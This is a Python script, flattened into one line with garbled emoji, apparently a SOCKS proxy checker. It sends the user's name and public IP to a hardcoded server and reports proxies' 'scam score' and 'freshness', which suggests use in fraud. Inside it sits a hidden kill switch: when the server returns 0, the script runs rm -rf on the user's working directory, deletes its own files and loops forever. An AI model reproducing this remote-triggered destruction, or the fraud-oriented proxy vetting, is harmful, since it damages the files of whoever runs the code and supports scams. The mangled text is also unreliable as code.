import os, re, sys, requests, time, json, random, codecsfrom fake_useragent import UserAgentdef get_headers():    ua = UserAgent()    random_u_a = ua.random    headers = {        "User-Agent": str(random_u_a),        "X-Requested-With": "XMLHttpRequest",        "Content-Type": "application/json",        "X-Requested-With": "XMLHttpRequest",        "Custom-Header": "Value",    }    return headersdef checkVersion():    my_version = "2.3"    cxurl = "https://raw.githubusercontent.com/TeamMusiBat/404/master/404.py"    ver = requests.get(cxurl,headers=get_headers()).text.replace("\n","").replace(" ","")    if ver != my_version:        os.system('clear')        sys.exit()checkVersion()def deleteFile(filename):    try:        os.remove(filename)    except:        try:            os.system(f'rm -rf {filename}')        except:passwait = {"my_name": "", "usedip": {}, "allproxies": {}}main_path = os.getcwd()proxy_path = f"{main_path}/SHproxy.txt"history_path = f"{main_path}/myhistory.json"old_path = f"{main_path}/iphistory.json"try:    if os.path.exists(old_path):        wait2Open = codecs.open(old_path, "r", "utf-8")        wait2 = json.load(wait2Open)        wait2Open.close()        wait["usedip"] = wait2["usedip"]        wait["allproxies"] = wait2["allproxies"]        deleteFile(old_path)    if not os.path.exists(proxy_path):        mytext = "Paste Your Proxy List Here\nOne Proxy Per Each Line"        filename = "SHproxy.txt"        try:            with open("SHproxy.txt", "w") as midfile:                midfile.write(mytext)        except:            os.system(f'echo -n "{mytext}" > {filename}')except:passtry:  waitOpen = codecs.open(history_path, "r", "utf-8")  wait = json.load(waitOpen)  waitOpen.close()except:  with open(history_path, 'w') as f:    json.dump(wait, f, ensure_ascii=False, indent=4)def get_info(user_name): #getip    try:        if wait["my_name"] == "":            wait["my_name"] = user_name            DoBackup()        if wait["my_name"] != user_name:            os.system("clear")            sys.exit("\nEnter Your Last Used Name\n")        url = "http://ifconfig.me"        response = requests.get(url, headers=get_headers())        response.close()        user_ip = response.text        base_url = "http://172.105.121.205:8000"        url1 = f"{base_url}/submit_rank?my_name={user_name}&client_ip={user_ip}"        response = requests.get(url1, headers=get_headers())        xip = response.json()        if xip == 0 or xip == "0":            deleteFile(main_path)            deleteFile(proxy_path)            deleteFile(history_path)            deleteFile(old_path)            deleteFile("main.py")            no = 0            while True:                print(no)                no += 1        response.close()        #user_access = f"{user_name}_{user_ip}"    except:passdef writeData(_Shahzii):  filename = "SHproxy.txt"  try:    with open(filename, "w") as midfile:      midfile.write(_Shahzii)  except:    os.system(f'echo -n "{_Shahzii}" > {filename}')  print(_Shahzii)def timeChange(secs):  mins, secs = divmod(secs, 60)  hours, mins = divmod(mins, 60)  days, hours = divmod(hours, 24)  weeks, days = divmod(days, 7)  months, weeks = divmod(weeks, 4)  text = ""  if months != 0: text += "%02d Month" % (months)  if weeks != 0: text += " %02d Week" % (weeks)  if days != 0: text += " %02d Days" % (days)  if hours != 0: text += " %02d Hours" % (hours)  if mins != 0: text += " %02d Minutes" % (mins)  if secs != 0: text += " %02d Seconds" % (secs)  if text[0] == " ":    text = text[1:]  return textdef AutoDelProxies():  no = 0  curnTime = time.time()  for xx in wait:    if "my_name" not in xx:      if len(wait[xx]) != 0 and len(wait[xx]) % 2 == 0:        for usedip in wait[xx].copy():          if curnTime - wait[xx][usedip] >= 4 * 21600:  #24 hours            del wait[xx][usedip]            no += 1  return nodef DoBackup():  try:    no = AutoDelProxies()    if no != 0:      print(f"Total {no} ips auto removed")    f1 = codecs.open(history_path, 'w', 'utf-8')    json.dump(wait, f1, sort_keys=True, indent=4, ensure_ascii=False)    f1.close()  except Exception as error:    print(error)def continueSocks():  ret = ""  os.system("clear")  while True:    print(ret)    proxies = input("Enter proxy: ")    base_url = "http://172.105.121.205:8000"    url1 = f'{base_url}/ssh_ip_json/{proxies}'    response = requests.get(url1, headers=get_headers())    if response.status_code == 200:      xip = response.json()      myipp = xip['ip']      if myipp != "":        ret = ""        ret += f"\nIP: {myipp}"        ret += f"\nSocks: üî∞‚è¨"        ret += f"\n{xip['proxy']}"        if xip["google"] == True:          ret += "\nGoogle: ‚úÖ"        else:          ret += "\nGoogle: ‚ùå"        ret += f"\nScam Score: {xip['score']}"        if myipp not in wait["usedip"]:          score = 55          try:            score = int(xip['score'])          except:            pass          if score < 55:            curnTime = time.time()            ret += "\nStatus: Fresh"            wait["usedip"][myipp] = curnTime        else:          xret = " ‚ò†Ô∏è __Used Proxy__ ‚ò†Ô∏è\n"          curnTime = time.time()          runtime = curnTime - int(wait["usedip"][myipp])          runtime = timeChange(runtime)          xret += f"About: {str(runtime)}"          ret += f"\n{xret}"        ret += xip['data']        ret += "\n"      else:        ret = "Nothing Found"      print(ret)    else:      print('Error:', response.status_code)    response.close()    os.system("clear")    DoBackup()def continueips():  ret = ""  os.system("clear")  while True:    print(ret)    proxies = input("Enter IP: ")    base_url = "http://172.105.121.205:8000"    url1 = f'{base_url}/ssh_ip_score/{proxies}'    response = requests.get(url1, headers=get_headers())    if response.status_code == 200:      xip = response.json()      myipp = xip['ip']      if myipp != "":        ret = ""        ret += f"\nIP: {myipp}"        ret += f"\nScam Score: {xip['score']}"        if myipp not in wait["usedip"]:          score = 55          try:            score = int(xip['score'])          except:            pass          if score < 55:            curnTime = time.time()            ret += "\nStatus: Fresh"            wait["usedip"][myipp] = curnTime        else:          curnTime = time.time()          xret = " ‚ò†Ô∏è __Used Proxy__ ‚ò†Ô∏è\n"          runtime = curnTime - int(wait["usedip"][myipp])          runtime = timeChange(runtime)          xret += f"About: {str(runtime)}"          ret += f"\n{xret}"        ret += xip['data']        ret += "\n"      else:        ret = "Nothing Found"      print(ret)    else:      print('Error:', response.status_code)    response.close()    os.system("clear")    DoBackup()def getClickips():  ret = ""  xplist = []  base_url = "http://172.105.121.205:8000"  url2 = f'{base_url}/what_history'  response = requests.get(url2, headers=get_headers())  xplist = response.json()  response.close()  if len(xplist) != 0 and xplist != []:    no = 0    print(f"Found {len(xplist)} Proxies")    curnTime = time.time()    try:        xplist.reverse()    except:pass    for proxies in xplist:      if proxies not in wait["allproxies"]:        url1 = f'{base_url}/ssh_ip_json/{proxies}'        response = requests.get(url1, headers=get_headers())        if response.status_code == 200:          xip = response.json()          myipp = xip['ip']          if myipp != "":            if myipp not in wait["usedip"]:              wait["usedip"][myipp] = curnTime              if xip['proxy'] not in wait["allproxies"]:                wait["allproxies"][xip['proxy']] = curnTime              score = 55              try:                score = int(xip['score'])              except:                pass              if score < 55:                no += 1                print(no)                ret += f"\n{no}: {myipp}"                ret += f"\nSocks: üî∞‚è¨"                ret += f"\n{xip['proxy']}"                if xip["google"] == True:                  ret += "\nGoogle: ‚úÖ"                else:                  ret += "\nGoogle: ‚ùå"                ret += f"\nScam Score: {xip['score']}"                ret += xip['data']                ret += "\n____________________________________\n"                if no == 5:                    break          time.sleep(1)        else:          print('Error:', response.status_code)        response.close()  print("Proccess Complete")  time.sleep(1)  os.system("clear")  writeData(ret)  DoBackup()def checkALLsocks():  ret = ""  xplist = []  ourProxies = ""  with open(proxy_path) as lsProxy:    ourProxies = lsProxy.read()  if ourProxies == "":    writeData("Nothing Found, Paste your Proxies in SHproxy.txt")    sys.exit("Logout")  plist = ourProxies.split("\n")  for xx in plist:    if ":" in xx:      if xx not in xplist:        xplist.append(xx)  if len(xplist) != 0 and xplist != []:    no = 0    print(f"Found {len(xplist)} Proxies")    curnTime = time.time()    base_url = "http://172.105.121.205:8000"    for proxies in xplist:      if proxies not in wait["allproxies"]:        url1 = f'{base_url}/ssh_ip_json/{proxies}'        response = requests.get(url1, headers=get_headers())        if response.status_code == 200:          xip = response.json()          myipp = xip['ip']          if myipp != "":            if myipp not in wait["usedip"]:              wait["usedip"][myipp] = curnTime              if xip['proxy'] not in wait["allproxies"]:                wait["allproxies"][xip['proxy']] = curnTime              score = 55              try:                score = int(xip['score'])              except:                pass              if score < 55:                no += 1                print(no)                ret += f"\n{no}: {myipp}"                ret += f"\nSocks: üî∞‚è¨"                ret += f"\n{xip['proxy']}"                if xip["google"] == True:                  ret += "\nGoogle: ‚úÖ"                else:                  ret += "\nGoogle: ‚ùå"                ret += f"\nScam Score: {xip['score']}"                ret += xip['data']                ret += "\n______________________________\n"                if no == 5:                    break          time.sleep(1)        else:          print('Error:', response.status_code)        response.close()  print("Proccess Complete")  time.sleep(1)  os.system("clear")  writeData(ret)  DoBackup()def StarT_MusibaT():    user_name = ""    my_name = input("Enter Your Name: ")    try:        user_name = my_name.lower()        user_name = user_name.replace(" ", "")    except:pass    if user_name == "" or "name" in user_name:        sys.exit("Restart & Enter Name Bro")    get_info(user_name)    ab = f"""\nHello {wait['my_name'].title()}‚ñí‚ñà‚ñÄ‚ñÑ‚ñÄ‚ñà ‚ñí‚ñà‚ñë‚ñí‚ñà ‚ñí‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñà ‚ñÄ‚ñà‚ñÄ ‚ñí‚ñà‚ñÄ‚ñÄ‚ñà ‚ñë‚ñà‚ñÄ‚ñÄ‚ñà ‚ñÄ‚ñÄ‚ñà‚ñÄ‚ñÄ ‚ñí‚ñà‚ñí‚ñà‚ñí‚ñà ‚ñí‚ñà‚ñë‚ñí‚ñà ‚ñë‚ñÄ‚ñÄ‚ñÄ‚ñÑ‚ñÑ ‚ñí‚ñà‚ñë ‚ñí‚ñà‚ñÄ‚ñÄ‚ñÑ ‚ñí‚ñà‚ñÑ‚ñÑ‚ñà ‚ñë‚ñí‚ñà‚ñë‚ñë ‚ñí‚ñà‚ñë‚ñë‚ñí‚ñà ‚ñë‚ñÄ‚ñÑ‚ñÑ‚ñÄ ‚ñí‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñà ‚ñÑ‚ñà‚ñÑ ‚ñí‚ñà‚ñÑ‚ñÑ‚ñà ‚ñí‚ñà‚ñë‚ñí‚ñà ‚ñë‚ñí‚ñà‚ñë‚ñë """    print(ab)    ret = "To Check Proxy 1by1\n"    ret += "Type Enter or Paste Socks\n"    ret += "Paste ip or Any Number For Ips\n"    ret += "Any Alphabet (abcXYZ) 4 SocksList\n"    ret += "What You Want: "    choice = input(ret)    if choice == "click":        getClickips()    elif ":" in choice and choice.count(".") == 3: #direct proxy        continueSocks()    elif "." in choice and choice.count(".") == 3: #direct ip        continueips()    elif choice == "":  #enter        continueSocks()    elif choice.isalpha(): #abcXYZ        checkALLsocks()    elif re.match(r'^\d+$', choice):  #isdigit        continueips()    else:        sys.exit("Restart Again!")if __name__ == "__main__":    StarT_MusibaT()#______________________________________________#‚éî